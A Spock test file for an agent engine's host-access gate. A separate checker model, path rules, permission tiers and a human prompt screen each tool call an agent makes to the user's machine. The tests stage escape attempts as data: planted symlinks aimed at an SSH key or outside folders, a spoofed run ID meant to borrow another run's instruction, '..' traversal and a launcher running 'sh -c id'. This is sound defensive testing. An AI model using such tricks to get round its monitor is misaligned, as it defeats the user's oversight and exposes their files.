package oillamp

import dev.lamp.Lamp
import dev.lamp.LampPrompt
import dev.lamp.LampEvent
import dev.lamp.LampFailedException
import spock.lang.Narrative
import spock.lang.Specification
import spock.lang.Subject
import spock.lang.TempDir
import spock.lang.Timeout
import spock.lang.Title

import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.attribute.PosixFilePermissions
import java.time.Duration
import java.util.concurrent.CompletableFuture
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.TimeUnit

@Title('Reaching the host: every request judged before it happens')
@Narrative('''
An application (a program built on oillamp's Java API, such as a desktop app) lets its agent
reach the user's own machine: read a document, write a file where
the user will find it, copy out what it made, open a page. The agent never gets a way out of the
sandbox of its own. It gets tools, and each call of one is a request that oillamp, on the host,
judges first and then carries out, or refuses.

## A request, on its way out

```
 sandbox: /home/agent              engine (host)                           the host
 ────────────────────              ─────────────                           ────────
 pi calls mcp__oillamp__host_read_file
   { path: "~/Documents/q3.md" }
        │ MCP: a tools/call, one JSON-RPC line,
        │ through socat
        ▼
 the session's socket  ─────────▶  sockets/host/host-access.sock
                                   │
                                   ├ 1. read: a call of a tool there is,
                                   │    with arguments that fit it
                                   ├ 2. the tier: closed is closed
                                   ├ 3. the paths: ~ is the user's home,
                                   │    no "..", never inside the lamp,
                                   │    under host_access.roots
                                   ├ 4. what the tool rules out by itself
                                   │
                                   ├ 5. the checker ─────────────────────▶ the model service
                                   │    the requirements, the run, the      (its own
                                   │    request; never the agent's          conversation)
                                   │    messages                     ◀──── a verdict
                                   │
                                   ├ 6. the person, for a command when the
                                   │    lamp says so, or a path past the roots
                                   │
                                   ├ 7. the paths once more, then ────────▶ ~/Documents/q3.md
                                   │    the effect
                                   └ logs/host-access-<session>.jsonl
        ◀──────────────────────────  the tool's result, or isError and why
```

Steps 1 to 4 need no model and cost nothing, so a refusal there never reaches the checker. The
checker is a separate model call with the user's requirements as its only authority. It is
made on the model the agent answers with, and follows it when the application changes it, unless
the lamp's file names a `checker_model` of its own. Which run a request belongs to is something
the engine knows, not something the request says, so the checker always reads the instruction of
the run the agent is really in.

The feature is off unless the lamp's `oillamp.toml` turns it on under `[host_access]`. An
application may give its own requirements with `LampDirectory.security`, but only for a lamp
whose file already turned it on.

## How the scenarios see it

The engine runs in this JVM against the simulated machine, connected to the lamp by real pipes.
A stand-in model service on loopback plays the checker: it records what it was shown, and
answers with the verdict the scenario sets. The scenarios speak MCP to the session's
host-access socket exactly as pi does through `socat` in the sandbox, and give the person's
decisions with `Lamp.decidePermission`, as an application would. So what is checked is the real gate, from the
request's first byte to the file on the host.
''')
@Timeout(value = 90, unit = TimeUnit.SECONDS)
class ReachingTheHostSpec extends Specification {

    /** The model the agent answers with, and so the one that judges, unless the file names another. */
    static final String MODEL = 'azure/gpt-6.1-sol'
    static final String REQUIREMENTS = 'You may read ~/Documents. Never read ~/.ssh.'

    @TempDir Path tmp
    @Subject ScenarioHost host
    /** The model service that plays the checker. */
    StandInChecker checker
    final List<LampEvent> events = new CopyOnWriteArrayList<>()
    Lamp lamp

    def setup() {
        host = new ScenarioHost(tmp)
        host.machine { it.reallyRuns('ssh-keygen') }
        checker = new StandInChecker()
        Files.createDirectories(host.home.resolve('Documents'))
    }

    def cleanup() {
        lamp?.close()
        checker?.close()
        events.clear()
    }

    def 'A lamp with host access on gives the agent the tools, and the checker judges every request first'() {
        reportInfo """
            Host access is off unless the lamp's `oillamp.toml` turns it on under `[host_access]`.
            Then the session serves a socket for it, and writes a small pi extension into the
            agent's home, `~/.pi/agent/extensions/oillamp-host-access.js`. The extension registers
            one MCP server with pi, named `oillamp`: a `socat` that connects pi to that socket.
            MCP, the Model Context Protocol, is how pi finds tools it does not have built in. pi
            asks the server with `tools/list` which tools there are, and the session answers with
            the tools this lamp offers and no others, such as `host_read_file`, which the model
            sees as `mcp__oillamp__host_read_file`.

            The checker is a separate model call that judges each request against the user's
            requirements before oillamp carries it out. A file read is the simplest request there
            is: the agent names a path the way a person would, from the home directory, oillamp
            resolves it on the host, asks the checker, and only then hands back what the file
            holds.

            The checker is asked in a conversation of its own. What it is shown has exactly three
            parts: the user's requirements, the run, and the request. There is no place in it for
            the agent's messages, because those are what a prompt injection, instructions hidden
            in something the agent read, would have changed.
        """
        given: 'a lamp that lets the agent read its Documents, and a file there'
            Files.writeString(host.home.resolve('Documents/q3.md'), '# Q3\nRevenue is up.\n')
            givenHostAccess(roots: [host.home.resolve('Documents')])

        when: 'the application starts the lamp, with a model service it can reach'
            start()

        then: 'the session says the way out is open, with the reading and writing tools, and no command tool'
            var enabled = events.find { it instanceof LampEvent.HostAccessEnabled } as LampEvent.HostAccessEnabled
            enabled.tools().contains('host_read_file')
            !enabled.tools().contains('host_bash')
            enabled.checker() == Optional.of(MODEL)

        and: 'the extension in the agent\'s home registers the MCP server, reached through socat'
            var extension = Files.readString(Lamp.agentHome(host.lampPath()).orElseThrow()
                    .resolve('.pi/agent/extensions/oillamp-host-access.js'))
            extension.contains('pi.registerMcpServer("oillamp"')
            extension.contains('command: "socat"')
            extension.contains('const SOCKET = "/oillamp/sockets/host/host-access.sock"')

        and: 'asked with tools/list, the server lists the tools this lamp offers, in the order the agent sees them'
            var listed = McpClient.initialized(hostAccessSocket()).withCloseable { it.request('tools/list', [:]) }
            (listed.result.tools as List<Map>)*.name == ['host_list_dir', 'host_stat', 'host_read_file', 'host_copy_in',
                    'host_show', 'host_open_url', 'host_write_file', 'host_edit_file', 'host_notify', 'host_copy_out']

        and: 'the agent\'s guide says it can reach the host, with which tools and under which folder'
            var guide = Files.readString(Lamp.agentHome(host.lampPath()).orElseThrow().resolve('AGENTS.md'))
            guide.contains("## Reaching the user's computer")
            guide.contains('| `mcp__oillamp__host_read_file` |')
            !guide.contains('host_bash')
            guide.contains("`${host.home.resolve('Documents')}`")

        when: 'the agent reads a document under the root, naming it from the home directory'
            var reply = ask('host_read_file', [path: '~/Documents/q3.md'])

        then: 'the request was allowed, and the agent was given the file'
            !reply.isError
            McpClient.text(reply).contains('Revenue is up.')

        and: 'the checker was asked once, with the requirements and the resolved request, and nothing else'
            checker.checked.size() == 1
            var seen = StandInChecker.judged(checker.checked.first())
            seen.keySet() == ['requirements', 'run', 'request'] as Set
            seen.requirements.text.contains(REQUIREMENTS)
            seen.request.tool == 'host_read_file'
            seen.request.resolved_paths*.host == [host.home.resolve('Documents/q3.md').toRealPath().toString()]
            events.any { it instanceof LampEvent.HostAccessDecided }

        and: 'the session\'s log has the request, in a file of its own'
            var logs = Files.list(host.lampPath().resolve('.oillamp/logs')).withCloseable { it.toList() }
                    .findAll { it.fileName.toString() ==~ /host-access-\d{8}-\d{6}\.jsonl/ }
            logs.size() == 1
            var entry = new groovy.json.JsonSlurper().parseText(Files.readAllLines(logs.first()).first()) as Map
            entry.outcome == 'done'
            entry.arguments.path == '~/Documents/q3.md'
    }

    def 'The checker reads what the run was asked, and the sandbox cannot say which run it is'() {
        reportInfo """
            The checker is a separate model call that judges each request against the user's
            requirements before oillamp carries it out. Intent is what the checker judges best, so
            it is shown the instruction of the run the request comes from. Which run that is, the
            session knows: it is the one the agent is working on. The request itself does not get
            a say, because a request that could name another run could borrow that run's
            instruction. Here the call names `run-999` in MCP's `_meta`, a field any client may
            fill with anything, and the checker is still shown the run the agent is in.
        """
        given: 'an agent that reads a document while it works on a question'
            Files.writeString(host.home.resolve('Documents/q3.md'), '# Q3')
            givenHostAccess(roots: [host.home.resolve('Documents')])
            Map answered = [:]
            host.machine { it.agent { String prompt ->
                answered.putAll(ask('host_read_file', [path: '~/Documents/q3.md'], [run: 'run-999']))
                'I read it.'
            } }
            start()

        when: 'the user asks'
            var run = lamp.send(LampPrompt.fresh('Summarise my Q3 notes'))
            waitFor(LampEvent.RunFinished) { it.run().id() == run.id() }

        then: 'the checker saw this run, and what the user asked in it'
            answered.content && !answered.isError
            var seen = StandInChecker.judged(checker.checked.first())
            seen.run.id == run.id()
            seen.run.instruction == 'Summarise my Q3 notes'
    }

    def 'When the checker refuses a read, oillamp does not read the file and gives the agent the reason'() {
        reportInfo """
            The checker is a separate model call that judges each request against the user's
            requirements before oillamp carries it out. A refusal is the feature working. The
            checker said no, so oillamp did not touch the file, and the agent is told the
            checker's reason, word for word: it is the one thing that helps the agent do something
            else instead.
        """
        given: 'a lamp whose checker refuses'
            Files.writeString(host.home.resolve('Documents/passwords.md'), 'hunter2')
            givenHostAccess(roots: [host.home.resolve('Documents')])
            checker.verdict = '{"decision":"deny","risk":"passive","reason":"The file looks like it holds passwords."}'

        when:
            start()
            var reply = ask('host_read_file', [path: '~/Documents/passwords.md'])

        then: 'the agent is told no, with the reason, and is given nothing of the file'
            reply.isError
            McpClient.text(reply).contains('The file looks like it holds passwords.')
            !McpClient.text(reply).contains('hunter2')
            checker.checked.size() == 1
    }

    def 'Oillamp treats an answer from the checker that is not a verdict, or claims more than the tool can do, as a refusal'() {
        reportInfo """
            The checker is a separate model call that judges each request against the user's
            requirements before oillamp carries it out. When in doubt, oillamp refuses. A checker
            that answers in prose instead of one JSON verdict, or that allows a read while rating
            it as running a program (`"risk":"executing"`), has not given a verdict oillamp can
            rely on, so oillamp refuses the request and does nothing.
        """
        given:
            Files.writeString(host.home.resolve('Documents/q3.md'), '# Q3')
            givenHostAccess(roots: [host.home.resolve('Documents')])
            start()

        when:
            checker.verdict = answer
            var reply = ask('host_read_file', [path: '~/Documents/q3.md'])

        then:
            reply.isError
            McpClient.text(reply).contains(why)

        where:
            answer                                                                    | why
            'Sure, that looks fine to me.'                                            | 'not one JSON verdict'
            '{"decision":"allow","risk":"executing","reason":"Fine."}'                | 'more than host_read_file can do'
    }

    def 'Oillamp refuses paths outside the roots, inside the lamp, or with .. in them, without asking the checker'() {
        reportInfo """
            The roots, `host_access.roots` in the lamp's `oillamp.toml`, are the folders on the
            host the agent may reach. They are the outer bound, and they are the one thing no
            model, not even the checker that judges each request, is asked about. A path outside
            them is a mistake or an attempt, not a judgement call. The lamp's own state — its
            keys, its history, the agent's home — is never reachable, also when the lamp was
            opened through a link. And a path with `..` in it is refused before it is resolved, so
            the path judged is the path used.
        """
        given: 'a lamp opened through a link to the lamps directory, reaching the whole home'
            Files.createSymbolicLink(host.home.resolve('linked'), Files.createDirectories(host.home.resolve('lamps')))
            givenHostAccess([:], host.home.resolve('linked/feature-x'))
            start(host.home.resolve('linked/feature-x'))

        when:
            var reply = ask('host_read_file', [path: asked])

        then: 'oillamp refuses it, and the checker was never asked'
            reply.isError
            McpClient.text(reply).contains(why)
            checker.checked.isEmpty()

        and: 'the refusal is an event, so the user sees the attempt'
            events.any { it instanceof LampEvent.HostAccessRefused }

        where:
            asked                                        | why
            '/etc/hostname'                              | 'not under'
            '~/lamps/feature-x/.oillamp/keys/client'     | 'inside the lamp'
            '~/lamps/feature-x/oillamp.toml'             | 'inside the lamp'
            '~/Documents/new/../../.ssh/id_ed25519'      | 'contains ".."'
    }

    def 'The agent writes a file on the host, and it is never left executable'() {
        reportInfo """
            Host access sorts what a tool does into tiers. Writing is the additive tier, which
            `allow_additive` in `[host_access]` opens or closes: it changes the host, in a way the
            user can see and undo. The file and the directories on the way are made, the file is
            written atomically, and whatever was there before, the result is plain data.
        """
        given:
            givenHostAccess(roots: [host.home.resolve('Documents')])
            checker.verdict = '{"decision":"allow","risk":"additive","reason":"The user asked for notes in Documents."}'
            var old = Files.writeString(host.home.resolve('Documents/run-me.md'), 'old')
            Files.setPosixFilePermissions(old, PosixFilePermissions.fromString('rwxr-xr-x'))
            start()

        when:
            var made = ask('host_write_file', [path: '~/Documents/notes/today.md', text: 'Café at ten.\n'])
            var replaced = ask('host_write_file', [path: '~/Documents/run-me.md', text: 'new'])

        then:
            !made.isError && !replaced.isError
            Files.readString(host.home.resolve('Documents/notes/today.md')) == 'Café at ten.\n'
            Files.readString(old) == 'new'
            PosixFilePermissions.toString(Files.getPosixFilePermissions(old)) == 'rw-r--r--'
    }

    def 'The tool `host_copy_out` copies a file out of the agent\'s home byte for byte, and does not follow a link there'() {
        reportInfo """
            The tool `host_copy_out` reads a file in the agent's home — any kind of file — and
            writes it on the host. The agent can put links in its home, so the file is read
            without following one: a link to the user's keys copies nothing.
        """
        given:
            givenHostAccess(roots: [host.home.resolve('Documents')])
            checker.verdict = '{"decision":"allow","risk":"additive","reason":"A report the user asked for."}'
            start()
            var agentHome = Lamp.agentHome(host.lampPath()).orElseThrow()
            Files.write(agentHome.resolve('workspace/report.pdf'), [0x25, 0x50, 0x44, 0x46, 0x00, 0xff] as byte[])
            Files.createDirectories(host.home.resolve('.ssh'))
            Files.writeString(host.home.resolve('.ssh/id_ed25519'), 'private')
            Files.createSymbolicLink(agentHome.resolve('workspace/key'), host.home.resolve('.ssh/id_ed25519'))

        when:
            var copied = ask('host_copy_out', [from: '~/workspace/report.pdf', path: '~/Documents/report.pdf'])
            var linked = ask('host_copy_out', [from: '~/workspace/key', path: '~/Documents/key.txt'])

        then: 'the report arrived byte for byte'
            !copied.isError
            Files.readAllBytes(host.home.resolve('Documents/report.pdf')) == [0x25, 0x50, 0x44, 0x46, 0x00, 0xff] as byte[]

        and: 'the link was not followed'
            linked.isError
            McpClient.text(linked).contains('link')
            !Files.exists(host.home.resolve('Documents/key.txt'))
    }

    def 'The tool `host_copy_in` copies a picture from the host into the agent\'s home byte for byte, and never executable'() {
        reportInfo """
            Let's consider a user who asks the agent to look at a picture in their `~/Documents`.
            `host_read_file` hands the agent text only, and refuses a picture as not text. The
            tool `host_copy_in` copies the file instead, from the host into the agent's home in
            the sandbox, where pi's own `read` shows the model an image. It is in the passive
            tier, like a read: on the host it changes nothing, and what it hands the agent is
            what a read would. So it is offered whenever host access is on, and the host path
            goes through the same checks as `host_read_file`: the roots, the lamp's own files, and
            the checker.

            The checker is shown both paths, `path` on the host and `to` in the sandbox, and so is
            the session's log, `.oillamp/logs/host-access-<session>.jsonl`. The copy arrives byte
            for byte, as `rw-r--r--`: a program copied in this way is never left executable.
        """
        given: 'a lamp that lets the agent read its Documents, and an executable picture there'
            byte[] picture = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0xff] as byte[]
            var cat = Files.write(host.home.resolve('Documents/cat.png'), picture)
            Files.setPosixFilePermissions(cat, PosixFilePermissions.fromString('rwxr-xr-x'))
            givenHostAccess(roots: [host.home.resolve('Documents')])
            start()

        when: 'the agent copies the picture into its workspace'
            var copied = ask('host_copy_in', [path: '~/Documents/cat.png', to: '~/workspace/cat.png'])

        then: 'the picture is in the agent\'s home, byte for byte, and not executable'
            !copied.isError
            var copy = Lamp.agentHome(host.lampPath()).orElseThrow().resolve('workspace/cat.png')
            Files.readAllBytes(copy) == picture
            PosixFilePermissions.toString(Files.getPosixFilePermissions(copy)) == 'rw-r--r--'

        and: 'the checker saw where it came from and where it went, and so does the log'
            var seen = StandInChecker.judged(checker.checked.first())
            seen.request.arguments.path == '~/Documents/cat.png'
            seen.request.arguments.to == '~/workspace/cat.png'
            seen.request.does == 'copy ~/Documents/cat.png from the host into the sandbox as ~/workspace/cat.png'
            var log = Files.list(host.lampPath().resolve('.oillamp/logs')).withCloseable { it.toList() }
                    .find { it.fileName.toString().startsWith('host-access-') }
            var entry = new groovy.json.JsonSlurper().parseText(Files.readAllLines(log).first()) as Map
            entry.arguments == [path: '~/Documents/cat.png', to: '~/workspace/cat.png']
    }

    def 'A link the agent planted in its home does not lead `host_copy_in` to write anywhere on the host'() {
        reportInfo """
            The agent can change anything in its home, links included, and on the host the home
            is a directory in the lamp. A copy written through a link the agent planted there
            would land wherever the link points: a write anywhere on the user's computer, past the
            checker, which only ever judged a copy into the sandbox. So `host_copy_in` writes
            one directory at a time, and never through a link.

            Here the agent planted two. `~/workspace/notes.txt` is a link to the user's
            `~/Documents/precious.txt`: the copy replaces the link in the agent's home, and the
            user's file stays as it was. `~/outside` is a link to the user's `~/Notes`
            directory: a copy to `~/outside/cat.png` is refused, and nothing appears in `~/Notes`.
        """
        given: 'a picture and a precious file on the host, and a lamp that lets the agent read its Documents'
            Files.write(host.home.resolve('Documents/cat.png'), [0x89, 0x50, 0x00] as byte[])
            var precious = Files.writeString(host.home.resolve('Documents/precious.txt'), 'keep me')
            var notes = Files.createDirectories(host.home.resolve('Notes'))
            givenHostAccess(roots: [host.home.resolve('Documents')])
            start()

        and: 'links the agent planted in its home, one at a file and one at a directory'
            var agentHome = Lamp.agentHome(host.lampPath()).orElseThrow()
            Files.createSymbolicLink(agentHome.resolve('workspace/notes.txt'), precious)
            Files.createSymbolicLink(agentHome.resolve('outside'), notes)

        when: 'the agent copies the picture onto each'
            var atFile = ask('host_copy_in', [path: '~/Documents/cat.png', to: '~/workspace/notes.txt'])
            var throughDirectory = ask('host_copy_in', [path: '~/Documents/cat.png', to: '~/outside/cat.png'])

        then: 'the link at the file was replaced by the copy, and the user\'s file is unchanged'
            !atFile.isError
            !Files.isSymbolicLink(agentHome.resolve('workspace/notes.txt'))
            Files.readAllBytes(agentHome.resolve('workspace/notes.txt')) == [0x89, 0x50, 0x00] as byte[]
            Files.readString(precious) == 'keep me'

        and: 'the copy through the linked directory was refused, and nothing landed in ~/Notes'
            throughDirectory.isError
            McpClient.text(throughDirectory).contains('link')
            Files.list(notes).withCloseable { it.toList() }.isEmpty()
    }

    def 'Oillamp does not copy a file into the sandbox that #why'() {
        reportInfo """
            `host_copy_in` hands a host file to the agent, so the file goes through the same
            checks as a read with `host_read_file`. A file outside `host_access.roots` is refused
            before the checker is asked; a file the checker refuses is not read. Either way
            nothing arrives in the agent's home.
        """
        given: 'a lamp that lets the agent read its Documents, and a picture in it and outside it'
            Files.createDirectories(host.home.resolve('Notes'))
            Files.write(host.home.resolve('Notes/secret.png'), [0x89, 0x50] as byte[])
            Files.write(host.home.resolve('Documents/cat.png'), [0x89, 0x50] as byte[])
            givenHostAccess(roots: [host.home.resolve('Documents')])
            checker.verdict = answer
            start()

        when: 'the agent asks to copy the picture into its workspace'
            var refused = ask('host_copy_in', [path: asked, to: '~/workspace/copy.png'])

        then: 'the agent is told why, and nothing arrived in its home'
            refused.isError
            McpClient.text(refused).contains(said)
            !Files.exists(Lamp.agentHome(host.lampPath()).orElseThrow().resolve('workspace/copy.png'))

        where:
            why                             | asked                  | answer                                                                       | said
            'is outside the roots'          | '~/Notes/secret.png'   | StandInChecker.ALLOW_PASSIVE                                                 | 'not under'
            'the checker refuses'           | '~/Documents/cat.png'  | '{"decision":"deny","risk":"passive","reason":"Not a picture the user named."}' | 'Not a picture the user named.'
    }

    def 'Oillamp refuses a tool of a closed tier, and a file the desktop would run, before it asks the checker'() {
        reportInfo """
            Host access sorts what a tool does into tiers, and the lamp's `oillamp.toml` opens or
            closes each. Whether the host may be changed at all is the user's setting, not a
            model's opinion: with `allow_additive = false`, oillamp refuses a write, and opening a
            web page, by that setting's name, without asking the checker, the model that judges
            each request. And "show" is for documents: a launcher shown with the user's default
            application would be run by it, which would be a way to run a program while running
            programs is closed.
        """
        given:
            Files.writeString(host.home.resolve('Documents/Report.desktop'), '[Desktop Entry]\nExec=sh -c id\n')
            givenHostAccess(roots: [host.home.resolve('Documents')], allowAdditive: false)
            start()

        when:
            var written = ask('host_write_file', [path: '~/Documents/x.md', text: 'x'])
            var shown = ask('host_show', [path: '~/Documents/Report.desktop'])
            var opened = ask('host_open_url', [url: 'https://example.org/?notes=secret'])

        then:
            written.isError && McpClient.text(written).contains('allow_additive is false')
            shown.isError && McpClient.text(shown).contains('runs rather than shows')
            opened.isError && McpClient.text(opened).contains('allow_additive is false')
            checker.checked.isEmpty()
    }

    def 'With `ask_the_user`, the user decides on a read outside the roots, and is asked again for the next one'() {
        reportInfo """
            The roots, `host_access.roots`, are the folders on the host the agent may reach. With
            `ask_the_user = true`, a request the checker allows that reaches past the roots goes
            to the user instead of being refused. The session sends the question as a
            `HostAccessAsked` event, and the application, a program built on oillamp's Java API,
            gives the user's decision with `Lamp.decidePermission`. Each question is its own: a
            yes once is not a yes for the next one.
        """
        given:
            Files.createDirectories(host.home.resolve('Notes'))
            Files.writeString(host.home.resolve('Notes/today.md'), 'Call the bank.')
            givenHostAccess(roots: [host.home.resolve('Documents')], askTheUser: true)
            start()

        when: 'the agent reads a note outside the roots, and the person says yes'
            var first = CompletableFuture.supplyAsync { ask('host_read_file', [path: '~/Notes/today.md']) }
            var asked = waitFor(LampEvent.HostAccessAsked) { true }
            answer(asked.what(), true)

        then: 'the person was told what, and the read happened'
            asked.tool() == 'host_read_file'
            asked.what().contains('outside the lamp\'s roots')
            !first.get(30, TimeUnit.SECONDS).isError

        when: 'it reads it again, and this time the person says no'
            events.clear()
            var second = CompletableFuture.supplyAsync { ask('host_read_file', [path: '~/Notes/today.md']) }
            answer(waitFor(LampEvent.HostAccessAsked) { true }.what(), false)

        then:
            var refused = second.get(30, TimeUnit.SECONDS)
            refused.isError
            McpClient.text(refused).contains('said no')
    }

    def 'An application can give the checker\'s requirements, but only for a lamp whose file turns host access on'() {
        reportInfo """
            An application, a program built on oillamp's Java API, with its own settings screen
            hands over the user's rules for the checker with `LampDirectory.security`, exactly as
            it hands over the model key. The text goes to the engine in its environment, not on
            its command line, and it wins over the file. The model that judges is the one the
            application gave the agent.

            What the application cannot do is turn the feature on: a lamp whose file says no stays
            closed — no socket, no extension, no tools — and the session warns the application
            with `OIL-HOSTACCESS-014` that its rules are not used.
        """
        given: 'a lamp with the feature turned on, but its own placeholder rules'
            Files.writeString(host.home.resolve('Documents/today.md'), 'today')
            givenHostAccess(roots: [host.home.resolve('Documents')], requirements: "the file's rules")

        when:
            lamp = Lamp.at(host.lampPath()).onEvent { events << it }
                       .modelService(checker.address()).modelKey('sk-0123456789').model(MODEL)
                       .security('Only ~/Documents, and nothing private.')
                       .launchedBy(host.launcher).start()
            lamp.awaitRunning(Duration.ofSeconds(30))
            var reply = ask('host_read_file', [path: '~/Documents/today.md'])

        then: 'the application\'s rules are the ones the checker saw, on the agent\'s model'
            !reply.isError
            StandInChecker.judged(checker.checked.first()).requirements.text == 'Only ~/Documents, and nothing private.'
            StandInChecker.modelOf(checker.checked.first()) == MODEL

        when: 'an application asks for host access on a lamp whose file has it off'
            var closed = host.lampPath('closed')
            host.givenConfig(closed, 'schema_version = 1\n')
            List<LampEvent> heard = new CopyOnWriteArrayList<>()
            var second = Lamp.at(closed).onEvent { heard << it }
                            .modelService(checker.address()).modelKey('sk-0123456789').model(MODEL)
                            .security('Read anything.')
                            .launchedBy(host.launcher).start()
            second.awaitRunning(Duration.ofSeconds(30))

        then: 'the lamp stays closed, and the application hears that its rules are unused'
            !Files.exists(Lamp.agentHome(closed).orElseThrow().resolve('.pi/agent/extensions/oillamp-host-access.js'))
            !Files.readString(Lamp.agentHome(closed).orElseThrow().resolve('AGENTS.md')).contains("## Reaching the user's computer")
            !heard.any { it instanceof LampEvent.HostAccessEnabled }
            heard.any { it instanceof LampEvent.Warning && it.problem().code().value() == 'OIL-HOSTACCESS-014' }
            Files.exists(closed.resolve('.oillamp/sockets/host/model.sock'))
            !Files.exists(closed.resolve('.oillamp/sockets/host/host-access.sock'))

        cleanup:
            second?.close()
    }

    def 'An application writes the host access switch and requirements into the lamp\'s file while no session runs'() {
        reportInfo """
            An application, a program built on oillamp's Java API, with a settings page for this,
            such as the desktop app Genies, writes the user's choices into the lamp's own
            `oillamp.toml` with `LampDirectory.hostAccess`, so the file stays what decides. Only
            `enabled` and `requirements` under `[host_access]` change; the rest of the file, the
            user's comments too, stays as it was. The requirements are free text: Genies puts the
            JSON its page builds there, and the checker reads it as it would any words.

            A running session read the file as it started and would not see a change, so
            `hostAccess` throws `LampFailedException` with the status `LAMP_BUSY` while a session
            runs. It also refuses to turn host access on with no requirements, as `oillamp.toml`
            itself would be refused.
        """
        given: 'a lamp with host access off, and a comment of the user\'s'
            Files.writeString(host.home.resolve('Documents/today.md'), 'today')
            host.givenConfig(host.lampPath(), """\
                schema_version = 1
                # my own note
                [host_access]
                enabled = false
                requirements = \'\'\'
                \'\'\'
                roots = ["${host.home.resolve('Documents')}"]
                """.stripIndent())
            var settings = Lamp.at(host.lampPath()).launchedBy(host.launcher)
            var rules = '{\n  "may_read": ["~/Documents"],\n  "never": "anything with \'\'\' in it"\n}'
            start()

        when: 'the application writes while a session runs'
            settings.hostAccess(true, rules)

        then: 'the lamp refuses, and the file is as it was'
            var busy = thrown(LampFailedException)
            busy.status() == dev.lamp.LampExitStatus.LAMP_BUSY
            !settings.hostAccess().enabled()

        when: 'the session ends, and the application writes again'
            lamp.close()
            lamp = null
            var written = settings.hostAccess(true, rules)

        then: 'the file says it, and nothing else in it changed'
            written == new Lamp.HostAccess(true, rules)
            settings.hostAccess() == written
            var file = Files.readString(host.lampPath().resolve('oillamp.toml'))
            file.startsWith('schema_version = 1\n# my own note\n[host_access]\nenabled = true\n')
            file.contains("roots = [\"${host.home.resolve('Documents')}\"]")

        when: 'a new session starts, and the agent reads a document'
            start()
            var reply = ask('host_read_file', [path: '~/Documents/today.md'])

        then: 'the checker judged it against what the application wrote'
            !reply.isError
            StandInChecker.judged(checker.checked.first()).requirements.text == rules

        when: 'the session ends, and the application turns host access on with no requirements'
            lamp.close()
            lamp = null
            settings.hostAccess(true, '')

        then: 'the lamp refuses that as it would refuse the file, and the file keeps its rules'
            thrown(LampFailedException)
            settings.hostAccess() == written
    }

    def 'The checker judges with the model the agent answers with, and follows it when it changes'() {
        reportInfo """
            The checker is a separate model call that judges each request against the user's
            requirements before oillamp carries it out. The user picked one model for the lamp,
            and that is the model they trust with it. So the checker judges a request with the
            model the agent answers with: the one the application started the lamp with, and, once
            the application changes it, the new one, from the next request on. A lamp whose file
            names a checker_model of its own keeps that one, whatever the agent answers with.
        """
        given:
            Files.writeString(host.home.resolve('Documents/today.md'), 'today')
            givenHostAccess(roots: [host.home.resolve('Documents')])
            start()

        when: 'the agent reads a document'
            ask('host_read_file', [path: '~/Documents/today.md'])

        then: 'the checker was asked on the agent\'s model'
            StandInChecker.modelOf(checker.checked.last()) == MODEL

        when: 'the application gives the agent another model, and the agent reads again'
            lamp.useModel('mistral/mistral-large-3')
            ask('host_read_file', [path: '~/Documents/today.md'])

        then: 'the checker moved with it, and the log says which model judged each request'
            StandInChecker.modelOf(checker.checked.last()) == 'mistral/mistral-large-3'
            var logs = Files.list(host.lampPath().resolve('.oillamp/logs')).withCloseable { it.toList() }
                    .findAll { it.fileName.toString().startsWith('host-access-') }
            Files.readAllLines(logs.first()).collect { (new groovy.json.JsonSlurper().parseText(it) as Map).checker } ==
                    [MODEL, 'mistral/mistral-large-3']

        when: 'the lamp\'s file names a checker of its own'
            lamp.close()
            lamp = null
            checker.checked.clear()
            givenHostAccess(roots: [host.home.resolve('Documents')], checker: 'azure/gpt-6.1-guard')
            start()
            ask('host_read_file', [path: '~/Documents/today.md'])
            lamp.useModel('mistral/mistral-large-3')
            ask('host_read_file', [path: '~/Documents/today.md'])

        then: 'that one judges, whatever the agent answers with'
            checker.checked.collect { StandInChecker.modelOf(it) } == ['azure/gpt-6.1-guard', 'azure/gpt-6.1-guard']
    }

    def 'Oillamp refuses to start a lamp with host access on but no model for the checker'() {
        reportInfo """
            The checker is a separate model call that judges each request against the user's
            requirements before oillamp carries it out. A lamp whose file turns host access on and
            names no `checker_model`, started without a model for the agent, has no model for the
            checker. Oillamp reports `OIL-HOSTACCESS-015` rather than start a session in which no
            request to the host could ever be allowed.
        """
        given:
            givenHostAccess(roots: [host.home.resolve('Documents')])

        when:
            lamp = Lamp.at(host.lampPath()).onEvent { events << it }
                       .modelService(checker.address()).modelKey('sk-0123456789')
                       .launchedBy(host.launcher).start()

        then:
            !lamp.awaitRunning(Duration.ofSeconds(30))
            events.any { it instanceof LampEvent.Failure && it.problem().code().value() == 'OIL-HOSTACCESS-015' }
            checker.checked.isEmpty()
    }

    // ─── helpers ───────────────────────────────────────────────────────────────────────────

    private void givenHostAccess(Map options, Path lampDir = host.lampPath()) {
        String roots = (options.roots ?: []).collect { "\"$it\"" }.join(', ')
        host.givenConfig(lampDir, """
            schema_version = 1

            [host_access]
            enabled = true
            ${options.checker ? "checker_model = \"${options.checker}\"" : ''}
            roots = [${roots}]
            allow_additive = ${options.allowAdditive ?: options.allowAdditive == null}
            ask_the_user = ${options.askTheUser ?: false}
            requirements = '''
            ${options.requirements ?: REQUIREMENTS}
            '''
        """.stripIndent())
    }

    private void start(Path lampDir = host.lampPath()) {
        lamp = Lamp.at(lampDir).onEvent { events << it }
                   .modelService(checker.address())
                   .model(MODEL)
                   .modelKey('sk-0123456789')
                   .launchedBy(host.launcher).start()
        assert lamp.awaitRunning(Duration.ofSeconds(30))
    }

    /**
     * One tool call on the session's host-access socket, as pi makes it: MCP, on a connection
     * that introduced itself first. {@code meta} is MCP's {@code _meta}, which a client may fill
     * with anything.
     */
    private Map ask(String tool, Map args, Map meta = [:]) {
        McpClient.initialized(hostAccessSocket()).withCloseable { it.call(tool, args, meta) }
    }

    /** The host-access socket of the running lamp, under the short runtime directory. */
    private Path hostAccessSocket() {
        Files.list(host.runtime.resolve('oillamp')).withCloseable { lamps ->
            lamps.map { it.resolve('sockets/host/host-access.sock') }.filter { Files.exists(it) }.findFirst().orElseThrow() }
    }

    /** The person's decision, as an application gives it. */
    private void answer(String request, boolean allowed) {
        lamp.decidePermission(request, allowed)
    }

    private <T extends LampEvent> T waitFor(Class<T> type, Closure<Boolean> which) {
        long until = System.nanoTime() + TimeUnit.SECONDS.toNanos(30)
        while (System.nanoTime() < until) {
            var found = events.find { type.isInstance(it) && which(it) }
            if (found != null) return (T) found
            Thread.sleep(20)
        }
        throw new AssertionError("no ${type.simpleName} within 30 seconds; heard ${events.collect { it.toString().take(200) }}")
